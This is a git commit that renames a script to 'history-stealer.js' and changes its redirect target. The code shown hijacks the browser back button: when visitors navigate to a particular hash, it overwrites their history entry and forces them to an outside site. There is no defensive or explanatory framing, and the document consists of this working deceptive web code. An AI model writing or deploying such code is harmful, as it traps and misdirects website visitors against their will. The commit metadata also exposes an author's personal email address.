a996bf5f02af48532a2364f425de1e9243f8efc7
darylfarahi <daryl30011996@gmail.com>
2019-01-13 08:53:46 +0700

    Update and rename history-stealer to history-stealer.js

--- history-stealer.js
+++ history-stealer.js
@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") {
     history.replaceState(null, document.title, location.pathname);
     setTimeout(function(){
-      location.replace("https://goodhomeids.com/redirect.php");
+      location.replace("https://pc-mind.com/sitemap_post.xml");
     },0);
   }
 }, false);
